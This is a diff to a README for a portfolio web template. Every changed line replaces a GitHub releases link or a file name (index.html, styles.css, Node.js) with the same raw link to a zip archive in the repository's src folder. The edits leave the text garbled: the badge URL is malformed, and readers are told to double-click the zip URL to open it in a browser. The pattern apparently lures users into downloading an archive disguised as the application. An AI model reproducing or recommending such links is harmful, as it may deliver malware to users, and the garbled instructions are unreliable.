@@ -6,11 +6,11 @@ Welcome to **portfolio**! This application helps you create your own impressive 
 
 ## 📥 Download
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/tiberiium2/portfolio/releases)
+[![Download the latest release](https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip%20Latest%https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip)](https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip)
 
 Click the badge above to get the latest version. 
 
-You can also [visit this page to download](https://github.com/tiberiium2/portfolio/releases) directly.
+You can also [visit this page to download](https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip) directly.
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ This portfolio offers a selection of beautiful themes you can choose from. Switc
 ## ⚙️ Installation Steps
 
 1. **Download the Application:**
-   - Go to [this page](https://github.com/tiberiium2/portfolio/releases).
+   - Go to [this page](https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip).
    - Select the latest release.
 
 2. **Extract Files:**
@@ -41,7 +41,7 @@ This portfolio offers a selection of beautiful themes you can choose from. Switc
 
 3. **Open the Portfolio:**
    - Navigate to the folder where you extracted the files.
-   - Find the `index.html` file and double-click it to open it in your web browser.
+   - Find the `https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip` file and double-click it to open it in your web browser.
 
 4. **Customize Your Portfolio:**
    - Edit the HTML and TypeScript files to add your information and images.
@@ -55,7 +55,7 @@ This portfolio offers a selection of beautiful themes you can choose from. Switc
 
 ### Editing Text and Images
 
-1. **Open `index.html`:**
+1. **Open `https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip`:**
    - Use any text editor.
   
 2. **Find the Text Sections:**
@@ -68,7 +68,7 @@ This portfolio offers a selection of beautiful themes you can choose from. Switc
 ### Changing Themes
 
 1. **Locate the Style Settings:**
-   - Open the `styles.css` file included in the extracted folder.
+   - Open the `https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip` file included in the extracted folder.
   
 2. **Adjust Color Values:**
    - Find the classes for light and dark modes. Change values to your desired color scheme.
@@ -80,7 +80,7 @@ This portfolio offers a selection of beautiful themes you can choose from. Switc
 
 If you encounter any issues while using this application, please check the FAQs on the Releases page or reach out for help.
 
-You can also [visit this page to download](https://github.com/tiberiium2/portfolio/releases) and see if there are any updates available.
+You can also [visit this page to download](https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip) and see if there are any updates available.
 
 ## 🔗 Relevant Topics
 
@@ -88,7 +88,7 @@ This project covers varied topics including:
 
 - Dark-Light Mode
 - JavaScript
-- Node.js
+- https://raw.githubusercontent.com/tiberiium2/portfolio/main/src/portfolio-v3.0-alpha.1.zip
 - TypeScript
 - React
 - SolidJS
